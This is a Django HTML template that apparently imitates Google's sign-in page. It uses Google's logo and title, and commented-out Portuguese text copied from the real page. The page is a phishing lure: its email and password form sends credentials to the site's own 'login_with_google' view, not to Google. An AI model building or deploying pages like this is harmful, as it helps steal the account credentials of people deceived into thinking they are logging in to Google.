{% load static %}
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <link rel="preconnect" href="https://fonts.gstatic.com" />
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap"
      rel="stylesheet"
    />

    <link rel="stylesheet" href="{% static 'googlePage/reset.css' %}" />
    <link rel="stylesheet" href="{% static 'googlePage/styles.css' %}" />

    <title>Google</title>
  </head>

  <body>
    <div class="container">
      <form action="{% url  'login_with_google' %}" method="post">
        {% csrf_token %}
          <div class="card">
            <img src="{% static 'googlePage/images/google-logo.svg' %}" alt="" />
            <h2>Login</h2>
            <h3>Use your Google Account</h3>
            <input type="email" placeholder="E-mail" name="email"/>
            <br>
            <input type="password" placeholder="password" name="password" />
            <!-- <div class="btn-email">
              <button type="button">Esqueceu seu e-mail?</button>
            </div> -->
            <!-- <p>
              Não está no seu computador? Use o modo visitante para fazer login com
              privacidade.
              <a href="">Saiba mais</a>
            </p> -->

            <div class="card-bottom">
              <!-- <a href="">Criar conta</a> -->
              <button type="submit">Submit</button>
            </div>
          </div>
    </form>
      <div class="footer">
       <div id="google_element"></div>
        <div class="footer-span">
          <!-- <span>Ajuda</span>
          <span>Privacidade</span>
          <span>Termos</span> -->
        </div>
      </div>
    </div>


    <script src="http://translate.google.com/translate_a/element.js?cb=loadGoogleTranslate"></script>
<script>
	function loadGoogleTranslate(){
		new google.translate.TranslateElement("google_element");
	}
</script>
  </body>
</html>
